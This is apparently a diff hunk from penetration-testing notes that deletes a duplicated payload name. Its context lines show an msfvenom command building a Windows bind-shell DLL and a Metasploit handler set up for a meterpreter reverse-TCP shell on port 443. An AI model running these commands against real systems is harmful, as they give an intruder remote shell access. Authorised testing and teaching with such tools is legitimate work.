@@ -46,7 +46,6 @@ msfvenom --platform Windows -p windows/shell_bind_tcp LPORT=443 -f DLL -o bind_s
 msfconsole -q
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-windows/meterpreter/reverse_tcp
 set lhost 10.0.0.1
 set lport 443
 exploit -j
